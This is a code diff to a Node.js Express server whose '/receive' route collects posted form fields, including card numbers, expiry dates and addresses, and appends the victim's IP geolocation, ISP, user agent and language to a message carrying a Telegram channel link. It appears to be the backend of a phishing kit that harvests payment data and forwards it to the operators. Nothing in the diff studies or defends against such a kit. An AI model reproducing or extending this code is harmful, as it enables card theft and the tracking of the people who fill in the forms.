@@ -60,10 +60,10 @@ app.post('/receive', async (req, res) => {
   let myObject = req.body;
 
   const sendAPIRequest = async (ipAddress) => {
-    const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
-    console.log(apiResponse.data);
-    return apiResponse.data;
-  };
+        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+		console.log(apiResponse.data);
+        return apiResponse.data;
+    };
 
   const ipAddress = getClientIp(req);
   const ipAddressInformation = await sendAPIRequest(ipAddress);
@@ -78,6 +78,20 @@ app.post('/receive', async (req, res) => {
       console.log(`${key}: ${myObject[key]}`);
       message += `${key}: ${myObject[key]}\n`;
     }
+    
+    message += `🌍 GEO-IP INFO\n` +
+		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
+        `CITY             : ${ipAddressInformation.location.city}\n` +
+        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+        `💻 SYSTEM INFO\n` +
+        `USER AGENT       : ${userAgent}\n` +
+        `SYSTEM LANGUAGE  : ${systemLang}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
   }
 
   if (myObjects.includes('Expiry-date') || myObjects.includes('Card-number') || myObjects.includes('Address')) {
@@ -88,6 +102,12 @@ app.post('/receive', async (req, res) => {
       console.log(`${key}: ${myObject[key]}`);
       message += `${key}: ${myObject[key]}\n`;
     }
+    
+    message += `🌍 GEO-IP INFO\n` +
+			`IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
+            `TIME             : ${ipAddressInformation.timezone.current_time}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
   }
 
   
